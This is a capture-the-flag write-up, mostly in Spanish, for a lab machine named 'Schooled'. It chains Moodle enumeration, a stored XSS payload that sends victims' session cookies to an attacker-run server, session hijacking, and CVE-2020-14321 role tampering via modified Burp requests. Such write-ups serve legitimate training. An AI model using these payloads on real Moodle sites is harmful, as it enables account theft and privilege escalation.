# Schooled Writeup
![Schooled]()

**Keyword summary:**
- VHost Brute Force
- Moodle (XSS)
- Stealing session cookie
- CVE-2020-25627
- CVE-2020-14321.
- Mass Assignment Attack
- Cracking Hashes from Moodle database
- Abusing sudoers privilege

# Enumeration
We will start by performing a scan of the ports that are open on the target IP, using the nmap tool.
This can be done as follows:
```bash
nmap -sS --min-rate 2500 -vvv -n --open -Pn [IP] 
```
Replace '[IP]' with the IP address to be scanned

We will see that the open ports are:

- 22/tcp | ssh
- 80/tcp | http
- 33060/tcp | mysqlx

![Puertos]()

now we can do para obtener un poco mas de información sobre los puertos abiertos de la IP Objetivo:
```bash
nmap -sCV -p22,80,33060 [IP]
```

Al enumerar los puertos de la IP objetivo, hemos identificado que nos interesa por ahora particularmente la página web alojada en el puerto 80.

### Website Enumeration
Llevaremos a cabo dos procesos de enumeración sobre esta pagina antes de ingresar en ella.

- Con la herramienta "whatweb" podemos obtener mas información de esta pagina
- Con el script "http-enum" con el que cuenta la herramienta nmap 
- 
```bash
whatweb [IP]
```
```bash
nmap --script http-enum -p80 [IP]
```
![whatweb&scriptnmap]()


De esta forma podemos ver que el sitio web en primer lugar es un FreeBSD y además podemos observar lo que parece ser un correo electronico **"admissions@schooled.htb"** Lo que nos puede interesar acerca de esto es que contamos con un dominio ```"schooled.htb"```. 

Asi que procederemos a entrar al sitio web

![web]()

Por ahora no vemos nada interesante, así, que en caso de que se este aplicando **Virtual Hosting** sobre el sitio web
Añadiremos en el archivo "/etc/hosts" el dominio que encontramos anteriormente. Ya que en algunos casos, acceder al sitio web mediante la dirección IP y acceder mediante un dominio no es lo mismo

**¿Que es Virtual Hosting?** [https://httpd.apache.org/docs/2.4/vhosts/].


![schooled.htb]()

Ingresemos al sitio nuevamente haciendo uso de este dominio

![webSchooled.htb]()

Y en este caso, pues el contenido de la pagina web es exactamente el mismo.
Así que explorando un poco más la pagina, en el apartado "teachers" podemos ver profesores que hacen parte de la institución educativa y su respectivo rol en esta. 

![teachers]()
De esta forma podemos ver que como atacantes nos interesaria poder acceder a la cuenta de "Lianne Carter" teacher, ya que cuenta con un rol de manager

# Moodle
****
Lo que podemos hacer ahora en busqueda de mas información sobre el sitio web es aplicar un reconocimiento de subdominios. Esto lo podemos hacer a través de la herramienta "gobuster"

```bash
gobuster vhost -u http://schooled.htb -w [wordlistPATH] -t 64 --apend-domain
```
![subdominio]()

gobuster encontró como subdominio existente en el sitio web **"moodle.schooled.htb"**
Así que vamos a agregar este subdominio en nuestro archivo "/etc/hosts"

![moodle.schooled.htb]()

**¿Que es Moodle?** [https://es.wikipedia.org/wiki/Moodle]

![paginamoodle]()
Efectivamente, el sitio web cuenta con un subdominio en el que podemos ver un Moodle que hace parte de la institución educativa

Así que creemos una cuenta nueva y entremos al moodle

Algo curioso es que al intentar registrarme en el Moodle, al colocar un correo electronico es requisito que este pertenezca al dominio **"student.schooled.htb"**
![emailleakinfo]()

(Al incorporar este subdominio en el archivo /etc/hosts nos lleva a la misma pagina inicial)

Una vez creada la cuenta nos encontraremos con esto:

![moodledashboard]()

Si nos dirigimos al apartado de "site home" encontraremos una serie de cursos que se ofrecen en la institución educativa. Revisando cada uno de los cursos podremos ver que solo podemos auto-inscribirnos en el curso de "Mathematics" que dirige el profesor "Manuel Phillips". Así que nos inscribiremos.
# Moodle Foothold
****
![Announcements]()
![reminder]()
En la sección "Announcements" del curso "Mathematics" en el que nos inscribimos, podemos ver el anuncio "Reminder for joining students". En este, el profesor nos indica that we need to set our ```"MoodleNet profile"``` y que estara revisando los perfiles de los estudiantes inscritos para verificar que el estudiante haya configurado este campo.

Por lo tanto, yendo a los ajustes del perfil de Moodle podemos ver el campo ```"MoodleNet profile"```
![moodlenet]()

**Pero... ¿que tipo de información debe ir en este campo?**
Bueno, intentemos escribiendo una palabra de test

![test]()
Vemos que en nuestro perfil de moodle se muestra:

![showingtest]()

De esta forma, lo que podemos probar como atacantes es verificar si el campo ```"MoodleNet profile"``` es vulnerable a XSS (Cross-Site Scripting)
**¿Que es Cross-Site Scripting?** [https://www.welivesecurity.com/la-es/2021/09/28/que-es-ataque-xss-cross-site-scripting/]

Entonces, lo que haremos es inyectar en el campo ```"MoodleNet profile"``` a test payload como el siguiente:
```bash
<script>alert('XSSTest'.)</script>
```
De esta forma, si actualizamos los cambios realizados en el perfil de Moodle y sí efectivamente el campo ```"MoodleNet profile"``` es vulnerable a **XSS**, al entrar a nuestro perfil de Moodle nos saldra una pequeña ventana emergente

![XSSTest]()

Perfecto!
### Exploiting XSS Vulnerabilities for Session Cookie Stealing
Teniendo en cuenta que el profesor estara revisando los perfiles de los estudiantes inscritos al curso, podemos **intentar robar su cookie de sesion** mediante un script malicioso inyectado en el campo ```"MoodleNet profile"```.

Para esto, utilizaremos el siguiente comando para establecer un servidor web simple por el puerto 80 de nuestra maquina
```python
python3 -m http.server 80
```
![python3sever]()
Ahora inyectaremos en el campo ```"MoodleNet profile"``` el siguiente payload que se encargara de robar la cookie de sesión del usuario que ingrese a nuestro perfil de Moodle 

```sh
<script>var i=new Image(); i.src="http://[OurIP]/?cookie="+btoa(document.cookie);</script>
```
![cookie]()

Podemos ver como se envia a nuestro servidor la cookie de sesión del profesor "Manuel Phillips"
Sin embargo, esta cookie se encuentra codificada en base64, asi que tenemos que decodificarla:

![stealingcookie]()
base6

```bash
MoodleSession=lan2a2hc9ub9qhkhdful6mnff2
```
Ahora que contamos con la cookie de sesion del profesor, podemos autenticarnos como el profesor

![cookieantes]()

![cookiedespues]()

Perfecto!

![Impersonification]()

Podemos ver como en la parte superior derecha se nos muestra que estamos dentro del sistema como el usuario **"Manuel Phillips"**

![Perfilprofe]()

Revisando el perfil del profesor, podemos ver que su correo pertenece a un dominio distinto, podemos probar si este dominio se encuentra como un subdominio del sitio web de la institución educativa. Sin embargo, este subdominio nos redirige a la misma pagina inicial.

# Moodle Version and Possible Vulnerabilities
****

Como Moodle es una aplicación Open Source, podemos investigar un poco acerca de sus contenidos por medio de:
[https://github.com/moodle/moodle]

Existe un archivo que nos permite ver hasta la fecha en que versión de Moodle nos encontramos, esta ruta es:

``` theme/upgrade.txt ```
Así que la podemos colocar en el navegador y consultar el archivo "upgrade.txt"
![versionmoodle]()

Así, parece ser que la **versión de Moodle que esta corriendo en el servidor es la "3.9"**

Con esta información podemos utilizar **"searchsploit"** para buscar vulnerabilidades sobre esta version de moodle
```bash
searchsploit Moodle 3.9
```

Podemos ver un exploit titulado como:
>Moodle 3.9 - Remote Code Execution (RCE) (Authenticated)

![searchsploit]()

```bash
searchsploit -x 50180
```

![exploitanalisis]()

Analizando un poco la estructura del exploit poodemos ver que lo que parece que esté intenta hacer es autenticarnos como manager y luego intentar aumentar los privilegios de la manager account para tener la capacidad de instalar plugins sobre el sistema

_At this point we could directly use the exploit and complete the machine eventually, however, to have a better understanding of what is going on regarding the vulnerability in this version of Moodle, we will do it manually._

Es importante mencionar que Moodle cuenta con un apartado de "Security Announcements", por lo que nos interesa saber de que fecha data la versión 3.9 de Moodle

![moodledate]()

Así, en la pagina [https://moodle.org/security/] podemos consultar por la fecha de la versión 3.9 de Moodle
![moodlevuln]()

Así, podemos ver que existe una vulnerabilidad sobre esta versión de Moodle identificada como: **CVE-2020-14321**
en la que podemos escalar privilegios a "manager role" partiendo desde un usuario de "Teacher". La vulnerabilidad funciona mediante la explotación de un "Mass Assignment Attack"

**¿Que es Mass Assignment Attack?**
https://www.vaadata.com/blog/what-is-mass-assignment-attacks-and-security-tips/

### Teacher Self-Assignment to Manager Role
****

Partiendo del hecho de que nos encontramos autenticados as the Manuel Phillips Teacher Nos vamos a dirigir a la lista de participantes del curso de matematicas que este usuario dirige. Podemos ver que contamos con un pequeño boton nombrado como "Enrol Users" en el que al parecer tenemos la capacidad de inscribir a estudiantes al curso de manera forzada.

**En este punto quiero que recordemos que contabamos con la información de que profesores se encontraban adscritos a la institución educativa**

![teachers]()

y como atacantes nos interesaria poder acceder a la cuenta de "Lianne Carter" teacher, ya que cuenta con un rol de manager.
Así que intentemos añadir al usuario "Lianne Carter" al curso de matematicas

![Agregaralcurso]()

El usuario "Lianne Carter" ha sido exitosanente inscrita en el curso de matematicas

![Agregada]()

Entonces, vamos a eliminar a este usuario de la lista de participantes del curso y analicemos con **Burpsuite** que ocurre cuando se envia la petición al agregar al usuario "Lianne Carter" al curso.

`(request intercepted by Burpsuite)`
```sh
GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid= 10&sesskey=l7mA1kfKdK&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0 &userlist%5B%5D=25&roletoassign=5&startdate=4&duration= HTTP/1.1
Host: moodle.schooled.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: en-US,en;q=0.5 6 Accept-Encoding: gzip, deflate, br
Content-Type: application/json 8 X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://moodle.schooled.htb/moodle/user/index.php?id=5 11 Cookie: MoodleSession=1an2a2hc9ub9qhkhdful6mnff2
```
`(Request Query parameters | From the request intercepted by Burpsuite)`

![burpsuite]()

```Es importante que la peticion interceptada por Burpsuite la enviemos al Repeater, allí haremos cambios y enviaremos la petición```

Podemos observar que la solicitud pasa dos parametros de interes:
-`userlist%5B%5D = 25`
-`roletoassign = 5`

- **userlist%5B%5D**
Para revisar la lista de usuarios en el sistema, podemos darnos cuenta que si consultamos nuestro perfil de Moodle (Que en este momento corresponde al del usuario Manuel Phillips). Podemos ver que en la barra del buscador la **"id"** del perfil corresponde a aquella identificada con el numero "24"
![profileid]()

Si cambiamos este valor en nuestro buscador, por el numero "25" 

![Lianncarterid]()

Se nos redirige al perfil del usuario "Liann Carter" en Moodle 

(creo que esto corresponderia a una vulnerabilidad leve de **Web Parameter Tampering** [https://owasp.org/www-community/attacks/Web_Parameter_Tampering])

**Back to the point**

Lo que podemos hacer entonces, es que haciendo uso de Burpsuite, con la petición interceptada podemos cambiar el valor de "25" a "24". y en seguida para el parametro:
- **roletoassign**
Moodle gestiona mediante la petición al parametro "roletoassign" que rol como profesor se desea tener sobre el usuario que se va a agregar al curso. **[Lo que es demasiado riesgoso].**
Desconocemos a que hace referencia el valor "5", pero podriamos pensar que si este valor es cambiado por un **"1"**. Por lo general este valor hace referencia al rol de **Administrador**. Así que cambiemos este parametro con la idea de que nos otorgaremos un privilegio de **Administrador** sobre el usuario al que vamos a agregar al curso.

Por lo tanto, nuestra petición interceptada deberia lucir de la siguiente forma:

`(Modified request intercepted by Burpsuite)`

>GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid= 10&sesskey=l7mA1kfKdK&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0 &userlist%5B%5D=```24```&roletoassign=```1```&startdate=4&duration= HTTP/1.1
Host: moodle.schooled.htb
.
.
<SNIP>

Una vez enviada la petición mediante el **Burpsuite Repeater** , en la sección **Proxy** de **Burpsuite**, let's drop the intercepted request.

when you drop the intercepted request, the user "Lianne Carter" will not be added to the course, so we are going to add her back in the normal way, without intercepting the request, just to have the facility to go to her profile.

Once in the profile of "Lianne Carter" we will be able to notice that we have the privileges of **Log in as Lianne Carter**.

![privilegiosLianne]()

Nice!

![logueado]()

Esto es una implementación con la que cuenta Moodle, nos encontramos autenticados como Manuel Phillips but logged in as Lianne Carter

![manuelLianne]()


Ahora, logged in as this user, we will have access to a "Site administration" panel

![Site_administration]()

**En Moodle una de las principales formas que hay para lograr inyectar comandos suele ser el panel de Plugins, sin embargo, a pesar de estar autenticados como Liann Carter, parece que no tenemos privilegios para subir Plugins al sistema**

![pluginsoff]()

# Mass Assignment Attack 
****
En el apartado "Users" podemos ver una sección "Permissions" 

![permissions]()

allí ingresaremos a "Define roles"

![listapermissions]()

Si damos click a "Manager" parece que tenemos un listado extenso de todo aquello que "Manager" role tiene permitido en Moodle y todo aquello que "Manager" role no tiene permitido en Moodle.

**¿Que se nos puede ocurrir?** un **Mass Assignment Attack** 
Así que vamos dar click en "Edit", activaremos **Burpsuite** and we will "Save Changes" para interceptar la petición

![burpsuitemass]()

Lo que vemos en Burpsuite son aquellos permisos y su valor con los que actualmente cuenta el usuario "Lianne Carter" en el sistema.

Existe un repositorio de GitHub acerca del (CVE-2020-14321) [https://github.com/HoangKien1020/CVE-2020-14321]
Aqui, en la sección "Payload to full permissions" parece explotarse un Mass Assignment Attack to have the full permissions in the system. Veremos que el estilo del Payload es muy similar a lo que tenemos en Burpsuite, asi que vamos a reemplazarlo

Ahora, verificaremos que tengamos los privilegios para subir Plugins al sistema

![pluginson]()


